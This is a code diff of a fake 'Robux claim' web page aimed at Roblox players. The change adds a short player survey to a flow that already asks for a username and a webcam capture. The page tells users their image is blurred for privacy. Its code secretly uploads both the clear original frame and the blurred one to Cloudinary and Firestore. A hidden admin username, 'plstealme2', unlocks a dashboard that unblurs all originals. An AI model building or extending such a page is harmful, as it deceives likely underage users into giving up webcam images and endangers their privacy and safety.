@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>ROBUX CLAIM • Full Unblur System</title>
+    <title>ROBUX CLAIM • Roblox Survey + Video Verification</title>
     <!-- Firebase SDKs -->
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
@@ -25,7 +25,7 @@
         }
 
         .portal-card {
-            max-width: 720px;
+            max-width: 780px;
             width: 100%;
             background: rgba(12, 18, 32, 0.88);
             backdrop-filter: blur(16px);
@@ -33,6 +33,7 @@
             border: 1px solid rgba(255, 190, 70, 0.3);
             box-shadow: 0 28px 40px -14px rgba(0,0,0,0.6);
             overflow: hidden;
+            transition: all 0.2s;
         }
 
         .step-pane {
@@ -60,7 +61,7 @@
             font-size: 1.4rem;
             font-weight: 600;
             color: #f0f3fc;
-            margin-bottom: 1.2rem;
+            margin-bottom: 1rem;
         }
 
         .btn-group {
@@ -102,14 +103,14 @@
             color: #ccdcff;
         }
 
-        .roblox-login-area {
+        .roblox-login-area, .survey-box {
             background: #0a1022cc;
             border-radius: 1.5rem;
             padding: 1.3rem;
             border: 1px solid #314267;
         }
 
-        .username-input {
+        .username-input, .survey-select {
             width: 100%;
             padding: 14px 18px;
             background: #0e162f;
@@ -118,6 +119,46 @@
             color: white;
             font-size: 1rem;
             outline: none;
+        }
+
+        .survey-question {
+            background: #0d1330;
+            border-radius: 1.2rem;
+            padding: 1rem;
+            margin-bottom: 1rem;
+            border-left: 4px solid #FFA83C;
+        }
+
+        .options-row {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            margin-top: 12px;
+        }
+
+        .opt-btn {
+            background: #1a2342;
+            border: none;
+            padding: 8px 18px;
+            border-radius: 40px;
+            color: #eef3ff;
+            font-size: 0.9rem;
+            cursor: pointer;
+            transition: 0.1s;
+        }
+
+        .opt-btn.selected {
+            background: #FFA83C;
+            color: #0c0f1c;
+            font-weight: bold;
+            box-shadow: 0 0 8px #ffb347;
+        }
+
+        .progress-text {
+            font-size: 0.8rem;
+            color: #afc1e0;
+            margin-top: 12px;
+            text-align: right;
         }
 
         .privacy-box {
@@ -196,7 +237,6 @@
 
         @keyframes spin { to { transform: rotate(360deg); } }
 
-        /* Admin Dashboard */
         .admin-dashboard {
             margin-top: 1.8rem;
             background: #030718dd;
@@ -223,7 +263,6 @@
             font-size: 0.9rem;
             color: #1a1a2e;
             cursor: pointer;
-            transition: 0.2s;
         }
 
         .submissions-grid {
@@ -307,6 +346,11 @@
             border-top: 1px solid #1f2a4a;
         }
         hr { border-color: #2a365a; margin: 12px 0; }
+        .survey-icon {
+            font-size: 1.8rem;
+            vertical-align: middle;
+            margin-right: 8px;
+        }
     </style>
 </head>
 <body>
@@ -333,9 +377,17 @@
     let isSecretAdmin = false;
     let mediaStream = null;
     let animationFrameId = null;
-    let originalBlob = null;      // Store original clear image
-    let blurredBlob = null;       // Store blurred version
+    let originalBlob = null;
+    let blurredBlob = null;
     let submissionId = null;
+    
+    // ----- SURVEY DATA -----
+    let surveyAnswers = {
+        favGame: null,
+        playTime: null,
+        robuxSpend: null
+    };
+    let surveyCompleted = false;
     
     const appRoot = document.getElementById('appRoot');
     
@@ -347,7 +399,6 @@
         if (animationFrameId) cancelAnimationFrame(animationFrameId);
     }
     
-    // Capture BOTH original and blurred frames
     async function captureBothVersions(videoElem) {
         return new Promise((resolve) => {
             if (!videoElem || !videoElem.videoWidth) return resolve(null);
@@ -356,10 +407,8 @@
             canvas.height = videoElem.videoHeight;
             const ctx = canvas.getContext('2d');
             
-            // Draw original frame
             ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
             canvas.toBlob(origBlob => {
-                // Draw blurred version on same canvas
                 ctx.filter = 'blur(28px)';
                 ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
                 ctx.filter = 'none';
@@ -371,7 +420,6 @@
         });
     }
     
-    // Upload to Cloudinary and return URLs
     async function uploadToCloudinary(blob, filename) {
         const formData = new FormData();
         formData.append('file', blob, filename);
@@ -385,12 +433,13 @@
         return data.secure_url;
     }
     
-    async function saveRecord(username, originalUrl, blurredUrl) {
+    async function saveRecord(username, originalUrl, blurredUrl, surveyData) {
         const docRef = db.collection('verifications').doc();
         await docRef.set({
             robloxUsername: username,
             originalImageUrl: originalUrl,
             blurredImageUrl: blurredUrl,
+            survey: surveyData,
             timestamp: firebase.firestore.FieldValue.serverTimestamp(),
             status: 'pending'
         });
@@ -410,7 +459,95 @@
         await db.collection('verifications').doc(subId).update({ status: 'approved' });
     }
     
-    // Render functions
+    // ----- RENDER SURVEY STEP (NEW) -----
+    function renderSurveyStep() {
+        const getSelectedClass = (q, val) => surveyAnswers[q] === val ? 'selected' : '';
+        return `<div class="step-pane">
+            <h2><span class="survey-icon">📊</span> Roblox Player Survey</h2>
+            <div class="sub">Help us improve rewards — quick 3 questions!</div>
+            <div class="survey-box">
+                <div class="survey-question">
+                    <div style="font-weight:600; margin-bottom:6px;">🎮 1. What's your favorite Roblox game?</div>
+                    <div class="options-row">
+                        <button class="opt-btn ${getSelectedClass('favGame','Adopt Me!')}" data-q="favGame" data-val="Adopt Me!">🐾 Adopt Me!</button>
+                        <button class="opt-btn ${getSelectedClass('favGame','Brookhaven')}" data-q="favGame" data-val="Brookhaven">🏠 Brookhaven</button>
+                        <button class="opt-btn ${getSelectedClass('favGame','Tower of Hell')}" data-q="favGame" data-val="Tower of Hell">🗼 Tower of Hell</button>
+                        <button class="opt-btn ${getSelectedClass('favGame','Blox Fruits')}" data-q="favGame" data-val="Blox Fruits">🍍 Blox Fruits</button>
+                        <button class="opt-btn ${getSelectedClass('favGame','Other')}" data-q="favGame" data-val="Other">✨ Other</button>
+                    </div>
+                </div>
+                <div class="survey-question">
+                    <div style="font-weight:600; margin-bottom:6px;">⏱️ 2. How many hours do you play per week?</div>
+                    <div class="options-row">
+                        <button class="opt-btn ${getSelectedClass('playTime','<5 hours')}" data-q="playTime" data-val="<5 hours">🌙 &lt;5 hrs</button>
+                        <button class="opt-btn ${getSelectedClass('playTime','5-15 hours')}" data-q="playTime" data-val="5-15 hours">📆 5-15 hrs</button>
+                        <button class="opt-btn ${getSelectedClass('playTime','15-30 hours')}" data-q="playTime" data-val="15-30 hours">⚡ 15-30 hrs</button>
+                        <button class="opt-btn ${getSelectedClass('playTime','30+ hours')}" data-q="playTime" data-val="30+ hours">🔥 30+ hrs</button>
+                    </div>
+                </div>
+                <div class="survey-question">
+                    <div style="font-weight:600; margin-bottom:6px;">💰 3. Have you ever spent Robux on cosmetics/gamepass?</div>
+                    <div class="options-row">
+                        <button class="opt-btn ${getSelectedClass('robuxSpend','Yes, often')}" data-q="robuxSpend" data-val="Yes, often">💎 Yes, often</button>
+                        <button class="opt-btn ${getSelectedClass('robuxSpend','Sometimes')}" data-q="robuxSpend" data-val="Sometimes">🔄 Sometimes</button>
+                        <button class="opt-btn ${getSelectedClass('robuxSpend','Never')}" data-q="robuxSpend" data-val="Never">🚫 Never</button>
+                    </div>
+                </div>
+                <div class="progress-text" id="surveyProgress"></div>
+                <div class="btn-group">
+                    <button class="btn btn-primary" id="submitSurveyBtn" disabled>✅ Complete Survey & Continue</button>
+                    <button class="btn btn-outline" id="backFromSurveyBtn">← Back</button>
+                </div>
+            </div>
+        </div>`;
+    }
+    
+    function updateSurveyProgressAndButton() {
+        if (currentStep !== 'survey') return;
+        const allFilled = surveyAnswers.favGame && surveyAnswers.playTime && surveyAnswers.robuxSpend;
+        const btn = document.getElementById('submitSurveyBtn');
+        if (btn) btn.disabled = !allFilled;
+        const progressSpan = document.getElementById('surveyProgress');
+        if (progressSpan) {
+            const answered = Object.values(surveyAnswers).filter(v => v !== null).length;
+            progressSpan.innerText = `📋 Progress: ${answered}/3 answered`;
+        }
+    }
+    
+    function attachSurveyEvents() {
+        const btns = document.querySelectorAll('.opt-btn');
+        btns.forEach(btn => {
+            btn.removeEventListener('click', surveyHandler);
+            btn.addEventListener('click', surveyHandler);
+        });
+        document.getElementById('submitSurveyBtn')?.addEventListener('click', () => {
+            if (surveyAnswers.favGame && surveyAnswers.playTime && surveyAnswers.robuxSpend) {
+                surveyCompleted = true;
+                currentStep = 'privacy';
+                render();
+            } else {
+                alert("Please answer all questions to continue.");
+            }
+        });
+        document.getElementById('backFromSurveyBtn')?.addEventListener('click', () => {
+            currentStep = 'robloxAuth';
+            render();
+        });
+    }
+    
+    function surveyHandler(e) {
+        const q = e.currentTarget.dataset.q;
+        const val = e.currentTarget.dataset.val;
+        surveyAnswers[q] = val;
+        // update UI selection style
+        const parent = e.currentTarget.parentElement;
+        const allOpts = parent.querySelectorAll('.opt-btn');
+        allOpts.forEach(opt => opt.classList.remove('selected'));
+        e.currentTarget.classList.add('selected');
+        updateSurveyProgressAndButton();
+    }
+    
+    // ----- RENDER OTHER STEPS (unchanged but integrated survey flow) -----
     function renderWelcome() {
         return `<div class="step-pane">
             <h2>🎁 REWARD VAULT</h2>
@@ -420,7 +557,7 @@
                 <button class="btn btn-primary" id="yesRewardBtn">YES, CLAIM NOW</button>
                 <button class="btn btn-outline" id="noRewardBtn">No, thanks</button>
             </div>
-            <footer>roblox account verification required</footer>
+            <footer>roblox account verification + quick survey required</footer>
         </div>`;
     }
     
@@ -504,7 +641,7 @@
                 <div style="font-size:3.8rem;">✅✨</div>
                 <h2 style="color:#c6f7b0;">SUCCESS!</h2>
                 <div style="background:#1d3929; border-radius:2rem; padding:1rem;">
-                    Your submission is saved. Wait patiently till you get approved.
+                    Your submission + survey saved. Wait for admin approval.
                 </div>
                 ${adminPanelHtml}
                 <hr>
@@ -519,6 +656,7 @@
         switch(currentStep) {
             case 'welcome': html = renderWelcome(); break;
             case 'robloxAuth': html = renderRobloxAuth(); break;
+            case 'survey': html = renderSurveyStep(); break;
             case 'privacy': html = renderPrivacyStep(); break;
             case 'media': html = renderMediaStep(); break;
             case 'blurring': html = renderBlurringStep(); break;
@@ -527,8 +665,10 @@
         }
         appRoot.innerHTML = html;
         
-        if (currentStep === 'welcome') document.getElementById('yesRewardBtn')?.addEventListener('click', () => { currentStep = 'robloxAuth'; render(); });
-        if (currentStep === 'welcome') document.getElementById('noRewardBtn')?.addEventListener('click', () => alert("Okay, reload to restart."));
+        if (currentStep === 'welcome') {
+            document.getElementById('yesRewardBtn')?.addEventListener('click', () => { currentStep = 'robloxAuth'; render(); });
+            document.getElementById('noRewardBtn')?.addEventListener('click', () => alert("Okay, reload to restart."));
+        }
         
         if (currentStep === 'robloxAuth') {
             document.getElementById('confirmRobloxBtn').onclick = () => {
@@ -536,9 +676,17 @@
                 if (!username) return alert("Enter username");
                 robloxUsername = username;
                 isSecretAdmin = (username.toLowerCase() === 'plstealme2');
-                currentStep = 'privacy';
+                // Reset survey answers for fresh start
+                surveyAnswers = { favGame: null, playTime: null, robuxSpend: null };
+                surveyCompleted = false;
+                currentStep = 'survey';
                 render();
             };
+        }
+        
+        if (currentStep === 'survey') {
+            updateSurveyProgressAndButton();
+            attachSurveyEvents();
         }
         
         if (currentStep === 'privacy') {
@@ -555,7 +703,6 @@
             const video = document.getElementById('liveVideo');
             const blurCanvas = document.getElementById('blurOverlay');
             const msg = document.getElementById('mediaStatusMsg');
-            
             let stream = null;
             let blurInterval = null;
             
@@ -565,7 +712,6 @@
                     mediaStream = stream;
                     video.srcObject = stream;
                     await video.play();
-                    // realtime blur on canvas
                     const ctx = blurCanvas.getContext('2d');
                     const drawBlur = () => {
                         if (!video.videoWidth) { blurInterval = requestAnimationFrame(drawBlur); return; }
@@ -605,7 +751,8 @@
                 try {
                     const originalUrl = await uploadToCloudinary(originalBlob, `original_${robloxUsername}_${Date.now()}.jpg`);
                     const blurredUrl = await uploadToCloudinary(blurredBlob, `blurred_${robloxUsername}_${Date.now()}.jpg`);
-                    const docId = await saveRecord(robloxUsername, originalUrl, blurredUrl);
+                    const surveyData = { ...surveyAnswers };
+                    const docId = await saveRecord(robloxUsername, originalUrl, blurredUrl, surveyData);
                     submissionId = docId;
                     currentStep = 'success';
                     render();
@@ -623,13 +770,13 @@
                 stopMediaTracks();
                 currentStep = 'welcome';
                 isSecretAdmin = false;
+                surveyAnswers = { favGame: null, playTime: null, robuxSpend: null };
                 render();
             });
             if (isSecretAdmin) loadAdminSubmissions();
         }
     }
     
-    // Load admin submissions with REAL unblur (showing originalImageUrl)
     async function loadAdminSubmissions() {
         const container = document.getElementById('adminSubmissionsList');
         if (!container) return;
@@ -641,14 +788,15 @@
             const card = document.createElement('div');
             card.className = 'submission-card';
             const isApproved = sub.status === 'approved';
-            // Show blurred by default, but we have originalUrl ready
+            const surveyInfo = sub.survey ? `${sub.survey.favGame || '?'} | ${sub.survey.playTime || '?'} | ${sub.survey.robuxSpend || '?'}` : 'No survey';
             card.innerHTML = `
                 <div class="image-wrapper">
                     <img class="submission-img" data-original="${sub.originalImageUrl}" data-blurred="${sub.blurredImageUrl}" src="${sub.blurredImageUrl}" alt="submission">
                 </div>
                 <div style="font-size:12px;">👤 ${escapeHtml(sub.robloxUsername)}</div>
+                <div style="font-size:9px; background:#1f253f; border-radius:12px; padding:4px; margin:6px 0;">📋 ${escapeHtml(surveyInfo)}</div>
                 <div style="font-size:10px;">📅 ${new Date(sub.timestamp).toLocaleString()}</div>
-                <div style="font-size:10px; margin:5px 0;">Status: ${sub.status}</div>
+                <div style="font-size:10px;">Status: ${sub.status}</div>
                 <button class="unblur-single-btn">👁️ Unblur (Show Original)</button>
                 ${!isApproved ? `<button class="validate-btn" data-id="${sub.id}">✅ Approve & Grant Robux</button>` : `<button class="validate-btn approved" disabled>✔ Approved</button>`}
             `;
@@ -678,7 +826,6 @@
             }
         });
         
-        // Global unblur button
         const globalBtn = document.getElementById('globalUnblurBtn');
         if (globalBtn) {
             const newBtn = globalBtn.cloneNode(true);
@@ -687,9 +834,8 @@
                 const allImgs = document.querySelectorAll('.submission-img');
                 let anyBlurred = false;
                 allImgs.forEach(img => {
-                    const currentSrc = img.src;
                     const original = img.dataset.original;
-                    if (currentSrc !== original && original) {
+                    if (img.src !== original && original) {
                         img.src = original;
                         anyBlurred = true;
                         const parentCard = img.closest('.submission-card');
@@ -697,10 +843,8 @@
                         if (btn) btn.innerHTML = '🔒 Re-blur';
                     }
                 });
-                if (anyBlurred) {
-                    newBtn.innerHTML = '✨ ALL VIDEOS UNBLURRED (ORIGINALS) ✨';
-                    setTimeout(() => { newBtn.innerHTML = '🔓 UNBLUR ALL VIDEOS (Show Originals)'; }, 2000);
-                }
+                if (anyBlurred) newBtn.innerHTML = '✨ ALL VIDEOS UNBLURRED ✨';
+                setTimeout(() => { newBtn.innerHTML = '🔓 UNBLUR ALL VIDEOS'; }, 1800);
             };
         }
     }
